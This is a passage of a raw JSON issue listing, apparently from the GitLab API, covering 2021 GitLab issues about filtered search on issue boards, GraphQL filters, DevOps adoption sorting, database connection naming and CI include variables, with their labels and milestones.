Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337686","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337686","notes":"https://gitlab.com/api/v4/projects/278964/issues/337686/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337686/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337686","relative":"#337686","full":"gitlab-org/gitlab#337686"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6517,"epic":{"id":320221,"iid":6517,"title":"Completely use new filtered search tokens on group/project issue boards","url":"/groups/gitlab-org/-/epics/6517","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91461607,"iid":337685,"project_id":278964,"title":"Add epic to new filtered search in issue boards","description":"Already available in GraphQL. Should be able to use the following query:\n\n```\nfragment EpicFilters on BoardList{\n  issues(filters: { epicId: 123, epicWildcardId: NONE }){\n    nodes\n  }\n}\n```\n\n---\n### Feature Flag\n\nWe're working on refactoring filtered search on boards to use GraphQL. This issue is part of that work, and is behind the `:issue_boards_filtered_search` feature flag.","state":"closed","created_at":"2021-08-04T22:43:17.641Z","updated_at":"2021-11-08T16:05:54.344Z","closed_at":"2021-10-20T23:43:53.217Z","closed_by":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"labels":["Category:Team Planning","Deliverable","auto updated","boards","devops::plan","documentation","frontend","group::product planning","section::dev","tw-weight::3","workflow::in review"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"}],"author":{"id":4447636,"username":"sstern","name":"Scott Stern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4447636/avatar.png","web_url":"https://gitlab.com/sstern"},"type":"ISSUE","assignee":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337685","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337685","notes":"https://gitlab.com/api/v4/projects/278964/issues/337685/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337685/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337685","relative":"#337685","full":"gitlab-org/gitlab#337685"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6517,"epic":{"id":320221,"iid":6517,"title":"Completely use new filtered search tokens on group/project issue boards","url":"/groups/gitlab-org/-/epics/6517","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91461590,"iid":337684,"project_id":278964,"title":"Add ability to filter by iteration on Boards through GraphQL","description":"Need to add the token to GraphQL filtered search. This is currently available for Boards with the following query:\n\n```\nfragment ReleaseFilters on BoardList{\n  issues(filters: { iterationId: 123, iterationTitle: \"foo\", iterationWildcardId: NONE }){\n    nodes\n  }\n}\n```\n\n---\n### Feature Flag\n\nWe're working on refactoring filtered search on boards to use GraphQL. This issue is part of that work, and is behind the `:issue_boards_filtered_search` feature flag.","state":"closed","created_at":"2021-08-04T22:42:24.466Z","updated_at":"2021-11-30T19:46:05.690Z","closed_at":"2021-11-08T23:15:09.155Z","closed_by":{"id":4447636,"username":"sstern","name":"Scott Stern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4447636/avatar.png","web_url":"https://gitlab.com/sstern"},"labels":["[deprecated] Accepting merge requests","auto updated"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[],"author":{"id":4447636,"username":"sstern","name":"Scott Stern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4447636/avatar.png","web_url":"https://gitlab.com/sstern"},"type":"ISSUE","assignee":null,"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337684","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337684","notes":"https://gitlab.com/api/v4/projects/278964/issues/337684/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337684/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337684","relative":"#337684","full":"gitlab-org/gitlab#337684"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6517,"epic":{"id":320221,"iid":6517,"title":"Completely use new filtered search tokens on group/project issue boards","url":"/groups/gitlab-org/-/epics/6517","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":{"id":38166,"iid":40,"sequence":1,"group_id":9970,"title":"Iteration 1: October 27, 2021 - November 09, 2021","description":"updated description","state":3,"created_at":"2021-10-22T17:12:40.529Z","updated_at":"2022-04-07T21:59:07.147Z","start_date":"2021-10-27","due_date":"2021-11-09","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/38166"},"health_status":null},{"id":91461543,"iid":337683,"project_id":278964,"title":"Add weight to issue boards new filtered search","description":"Before raising an issue to the GitLab issue tracker, please read through our guide for finding help to determine the best place to post:\n\n* https://about.gitlab.com/getting-help/\n\nIf you are experiencing an issue when using GitLab.com, your first port of call should be the Community Forum. Your issue may have already been reported there by another user. Please check:\n\n* https://forum.gitlab.com/\n\nIf you feel that your issue can be categorized as a reproducible bug or a feature proposal, please use one of the issue templates provided and include as much information as possible.\n\nThank you for helping to make GitLab a better product.","state":"closed","created_at":"2021-08-04T22:40:08.844Z","updated_at":"2021-09-16T16:16:48.580Z","closed_at":"2021-09-16T04:32:51.519Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["auto updated"],"milestone":null,"assignees":[],"author":{"id":4447636,"username":"sstern","name":"Scott Stern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4447636/avatar.png","web_url":"https://gitlab.com/sstern"},"type":"ISSUE","assignee":null,"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337683","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337683","notes":"https://gitlab.com/api/v4/projects/278964/issues/337683/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337683/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337683","relative":"#337683","full":"gitlab-org/gitlab#337683"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6517,"epic":{"id":320221,"iid":6517,"title":"Completely use new filtered search tokens on group/project issue boards","url":"/groups/gitlab-org/-/epics/6517","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91461430,"iid":337682,"project_id":278964,"title":"Add frontend support for negated issue type for issue boards","description":"Before raising an issue to the GitLab issue tracker, please read through our guide for finding help to determine the best place to post:\n\n* https://about.gitlab.com/getting-help/\n\nIf you are experiencing an issue when using GitLab.com, your first port of call should be the Community Forum. Your issue may have already been reported there by another user. Please check:\n\n* https://forum.gitlab.com/\n\nIf you feel that your issue can be categorized as a reproducible bug or a feature proposal, please use one of the issue templates provided and include as much information as possible.\n\nThank you for helping to make GitLab a better product.","state":"closed","created_at":"2021-08-04T22:35:16.422Z","updated_at":"2021-09-16T04:30:51.391Z","closed_at":"2021-09-16T04:30:51.186Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["auto updated","devops::plan","frontend","section::dev"],"milestone":null,"assignees":[],"author":{"id":4447636,"username":"sstern","name":"Scott Stern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4447636/avatar.png","web_url":"https://gitlab.com/sstern"},"type":"ISSUE","assignee":null,"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337682","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337682","notes":"https://gitlab.com/api/v4/projects/278964/issues/337682/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337682/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":"https://gitlab.com/api/v4/projects/278964/issues/337662"},"references":{"short":"#337682","relative":"#337682","full":"gitlab-org/gitlab#337682"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6517,"epic":{"id":320221,"iid":6517,"title":"Completely use new filtered search tokens on group/project issue boards","url":"/groups/gitlab-org/-/epics/6517","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91457284,"iid":337666,"project_id":278964,"title":"[DevOps] Sorting for table on DevOps adoption Overview tab","description":"### Overview\n\nhttps://gitlab.com/gitlab-org/gitlab/-/issues/335638 adds the DevOps Adoption table to the Overview tab but doesn't include sorting. \n\n### Proposal\n\nInclude the same sorting functionality as the DevOps Adoption table in the Dev Sec and Ops tabs.","state":"closed","created_at":"2021-08-04T20:07:24.343Z","updated_at":"2021-10-10T08:42:53.708Z","closed_at":"2021-09-29T05:48:11.797Z","closed_by":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"labels":["GitLab Ultimate","auto updated","devops::manage","feature::addition","frontend","group::optimize","priority::2","release post item::secondary","section::dev","type::feature","workflow::verification"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"}],"author":{"id":4447217,"username":"ljlane","name":"Larissa Lane","state":"blocked","avatar_url":"https://secure.gravatar.com/avatar/ac4027d3a4e3bd62740ea1443a42f6c5?s=80\u0026d=identicon","web_url":"https://gitlab.com/ljlane"},"type":"ISSUE","assignee":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"user_notes_count":3,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337666","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337666","notes":"https://gitlab.com/api/v4/projects/278964/issues/337666/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337666/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337666","relative":"#337666","full":"gitlab-org/gitlab#337666"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91455303,"iid":337662,"project_id":278964,"title":"Allow filtering of issues within boards by negate issue type in GraphQL","description":"The GraphQL api is missing the ability to filter issues by negated issue type (i.e. `not: { issue_type: \"INCIDENT\" }`.\n\nOn the ~frontend, add support for this within issue boards.\n\n---\n### Feature Flag\n\nWe're working on refactoring filtered search on boards to use GraphQL. This issue is part of that work, and is behind the `:issue_boards_filtered_search` feature flag.","state":"closed","created_at":"2021-08-04T19:09:58.583Z","updated_at":"2021-11-18T07:00:39.790Z","closed_at":"2021-11-17T23:24:05.078Z","closed_by":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"labels":["Deliverable","backend","backend complete","devops::plan","frontend","group::product planning","section::dev","type::feature","workflow::production"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"}],"author":{"id":194645,"username":"digitalmoksha","name":"Brett Walker","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/194645/avatar.png","web_url":"https://gitlab.com/digitalmoksha"},"type":"ISSUE","assignee":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337662","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337662","notes":"https://gitlab.com/api/v4/projects/278964/issues/337662/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337662/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337662","relative":"#337662","full":"gitlab-org/gitlab#337662"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6517,"epic":{"id":320221,"iid":6517,"title":"Completely use new filtered search tokens on group/project issue boards","url":"/groups/gitlab-org/-/epics/6517","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91452660,"iid":337656,"project_id":278964,"title":"Gitlab.com to Salesforce Process Review","description":"- [ ] As discussed [here](https://gitlab.com/gitlab-com/business-technology/enterprise-apps/bsa/business-systems-analysts/-/issues/121#note_643254735)\n\n\u003e hi @tyleramos @teresatison - thanks again for all of the help with the sales assisted Opp to License flow. I was wondering if I could request your review once more to put together a web direct flow? I wasn't able to find a ton of info on this scraping the handbook so would appreciate any resources or feedback to make sure its accurate. PDF: [GitLab_Opportunity____License_Process_-*New_Subscription*-_Web_Direct.pdf](https://gitlab.com/gitlab-com/business-technology/enterprise-apps/bsa/business-systems-analysts/uploads/8f08e7a1fb4dbb28ecb125eefade453d/GitLab_Opportunity____License_Process_-_New_Subscription_-_Web_Direct.pdf)","state":"closed","created_at":"2021-08-04T17:50:36.761Z","updated_at":"2022-09-22T19:21:48.099Z","closed_at":"2022-09-22T19:21:48.071Z","closed_by":{"id":7964536,"username":"courtmeddaugh","name":"Courtney Meddaugh","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7964536/avatar.png","web_url":"https://gitlab.com/courtmeddaugh"},"labels":["[deprecated] Accepting merge requests","[deprecated] Category:Provision","backend","devops::fulfillment","group::provision","maintenance::refactor","quad-planning::complete-no-action","section::fulfillment","type::maintenance","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":7971452,"username":"teresatison","name":"Teresa Tison","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7971452/avatar.png","web_url":"https://gitlab.com/teresatison"},"type":"ISSUE","assignee":null,"user_notes_count":5,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337656","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337656","notes":"https://gitlab.com/api/v4/projects/278964/issues/337656/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337656/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337656","relative":"#337656","full":"gitlab-org/gitlab#337656"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91450745,"iid":337651,"project_id":278964,"title":"\"An error occurred fetching the approval rules.\" in merge request","description":"The same issue was a few year ago: https://gitlab.com/gitlab-org/gitlab-foss/-/issues/60851 \nIn the issue that I linked above, there are new comments like \"it's happen again\" and so on.\n\n![Screenshot_at_Aug_04_19-57-13](/uploads/14f3487a08ffa248a39aa997d171040d/Screenshot_at_Aug_04_19-57-13.png)\n![Screenshot_at_Aug_04_19-59-33](/uploads/f02d34db0d2339384f1e8cad8af7a81c/Screenshot_at_Aug_04_19-59-33.png)","state":"closed","created_at":"2021-08-04T17:00:51.413Z","updated_at":"2021-09-18T13:42:58.760Z","closed_at":"2021-08-21T16:44:28.547Z","closed_by":{"id":64248,"username":"stanhu","name":"Stan Hu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/64248/stanhu.jpg","web_url":"https://gitlab.com/stanhu"},"labels":["Category:Source Code Management","devops::create","group::compliance","priority::3","section::dev","severity::4","type::bug"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"}],"author":{"id":8188733,"username":"pmpbamd","name":"Alex T","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8188733/avatar.png","web_url":"https://gitlab.com/pmpbamd"},"type":"ISSUE","assignee":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"user_notes_count":13,"merge_requests_count":0,"upvotes":5,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337651","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337651","notes":"https://gitlab.com/api/v4/projects/278964/issues/337651/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337651/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337651","relative":"#337651","full":"gitlab-org/gitlab#337651"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91444043,"iid":337639,"project_id":278964,"title":"Require that database connections always use consistent names","description":"Database connections (in `database.yml`) can be anything today. As part of the work to support multiple databases, we'll need to require that certain clusters always use a consistent name. This is needed so we can use these names elsewhere, such as in cache keys (see https://gitlab.com/gitlab-org/gitlab/-/merge_requests/66280#note_643159855 for some details).\n\nFor the main database cluster, we should simply use `main`. For CI we'll use `ci`. For Geo we'll use `geo`. If a connection is configured using a different name, we should throw an exception.\n\nThis is technically a breaking change, as it _may_ break existing installations. As such we should announce this change, and probably hold off on requiring the naming scheme until at least one release after the announcement.","state":"closed","created_at":"2021-08-04T14:52:57.279Z","updated_at":"2022-05-31T12:22:01.690Z","closed_at":"2021-08-05T10:11:55.576Z","closed_by":{"id":209240,"username":"yorickpeterse","name":"Yorick Peterse","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/209240/avatar.png","web_url":"https://gitlab.com/yorickpeterse"},"labels":["Category:Pods","[deprecated] Accepting merge requests","auto updated","database","devops::data_stores","group::pods","section::enablement","type::maintenance"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":209240,"username":"yorickpeterse","name":"Yorick Peterse","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/209240/avatar.png","web_url":"https://gitlab.com/yorickpeterse"},"type":"ISSUE","assignee":null,"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337639","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337639","notes":"https://gitlab.com/api/v4/projects/278964/issues/337639/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337639/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":"https://gitlab.com/api/v4/projects/278964/issues/336566"},"references":{"short":"#337639","relative":"#337639","full":"gitlab-org/gitlab#337639"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6103,"epic":{"id":281355,"iid":6103,"title":"Decomposition: Support for many databases","url":"/groups/gitlab-org/-/epics/6103","group_id":9970,"human_readable_end_date":"Sep 16, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91430362,"iid":337633,"project_id":278964,"title":"Support additional variables in the include field","description":"This is a follow up from https://gitlab.com/gitlab-org/gitlab/-/issues/219065 and #276515 where we implement support for a set of variables\n\n* Project Predefined variables :white_check_mark:\n* Project variables :white_check_mark:\n* Group variables :white_check_mark:\n* Instance variables :white_check_mark:\n* Variables added when a pipeline is created manually via the UI or API :no_entry_sign:\n* Pipeline predefined variables :no_entry_sign: \n\nThis issue is for completing the list of supported variables\n\n### Documentation\nBased on the discussion below we should document that we will not have [all pipeline predefined variables](https://gitlab.com/gitlab-org/gitlab/-/blob/ae8fd6adc64bbd31d7dd22d3883a5745838cc6c3/app/models/ci/pipeline.rb#L793-826). For example; we won't have `CI_PIPELINE_IID` and `CI_PIPELINE_CREATED_AT` because the pipeline doesn't persist yet. (we can add additional variables if we'll discover more)","state":"closed","created_at":"2021-08-04T11:38:00.933Z","updated_at":"2022-08-09T19:57:35.307Z","closed_at":"2021-11-03T13:46:21.561Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["CI variables","Category:Pipeline Authoring","backend","candidate::14.5","customer","devops::verify","feature::enhancement","group::pipeline authoring","section::ops","type::feature","workflow::production"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":4509877,"username":"dhershkovitch","name":"Dov Hershkovitch","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7daa3113f0359f08a217fa800d9cc1d2?s=80\u0026d=identicon","web_url":"https://gitlab.com/dhershkovitch"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":35,"merge_requests_count":0,"upvotes":18,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337633","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337633","notes":"https://gitlab.com/api/v4/projects/278964/issues/337633/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337633/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337633","relative":"#337633","full":"gitlab-org/gitlab#337633"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":36606,"iid":35,"sequence":2,"group_id":9970,"title":"Pipeline Authoring: November 01, 2021 - November 14, 2021","description":"Target milestone `14.5`","state":3,"created_at":"2021-10-05T20:42:58.372Z","updated_at":"2021-12-21T15:27:22.624Z","start_date":"2021-11-01","due_date":"2021-11-14","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/36606"},"health_status":"on_track"},{"id":91427897,"iid":337628,"project_id":278964,"title":"[Feature flag] Rollout of 